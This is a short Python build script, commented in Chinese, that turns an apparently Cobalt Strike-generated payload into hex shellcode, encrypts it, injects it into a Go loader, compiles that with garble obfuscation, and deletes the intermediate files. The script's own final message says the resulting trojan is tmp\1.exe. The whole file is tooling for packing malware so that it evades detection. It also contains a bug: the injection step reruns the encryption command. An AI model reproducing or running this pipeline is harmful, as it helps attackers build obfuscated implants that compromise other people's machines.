import os
import subprocess
import time

# 将cs生成的payload转换为16进制写入tmp目录下的payload_text.txt
commod = ".\\tool\\shellcode_16\\shellcode.exe .\\payload_x64.cs >>.\\tmp\\payload_text.txt"

# 进行加密
commod_en = ".\\test\\encode\\encode.exe .\\tmp\\payload_text.txt >> .\\tmp\\payload_encode.txt"
print("————正在进行payload转16进行操作—————")
resp = os.system(commod)
print(resp)
time.sleep(0.5)
print("————————————————成功——————————————")

# 将16进制进行加密
print("————————————正在进行加密————————————")
resp = os.system(commod_en)
print(resp)
time.sleep(0.5)
print("——————————————加密成功——————————————")
# 把shellcode替换到exe中
commod_th = "python .\\test\\decode\\1.py .\\tmp\\payload_encode.txt"
print("————————————正在进行替换————————————")
resp = os.system(commod_en)
print(resp)
time.sleep(0.5)
print("——————————————替换成功——————————————")

# 使用 garble 编译脚本的命令
commod_build = ["garble", "-seed=random", "-literals", "build", "-o", "..\\..\\tmp\\1.exe", "script.go"]

# 如果 Go 代码编译成功，运行 garble 命令
print("正在运行 garble 命令...")
garble_process = subprocess.Popen(commod_build, cwd=".\\test\\decode", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  text=True)

# 实时读取 garble 命令输出
while True:
    output = garble_process.stdout.readline()
    error_output = garble_process.stderr.readline()

    if output == '' and error_output == '' and garble_process.poll() is not None:
        break
    if output:
        print("STDOUT:", output.strip())
    if error_output:
        print("STDERR:", error_output.strip())

# 获取 garble 命令返回码
garble_return_code = garble_process.poll()

# 检查 garble 命令是否成功
if garble_return_code == 0:
    print("garble 命令执行成功")
else:
    print("garble 命令执行失败")

print("——————————————构建成功——————————————")
print("——————————————生成成功——————————————")
# commod="del .\\tmp\\payload_encode.txt && del .\\tmp\\payload_text.txt"
print("————————————正在进行删除————————————")
resp = os.system("del .\\tmp\\payload_text.txt")
resp = os.system("del .\\tmp\\payload_encode.txt")
print(resp)
time.sleep(0.5)
print("——————————————删除成功——————————————")
print("———————木马在tmp下名字加1.exe————————")
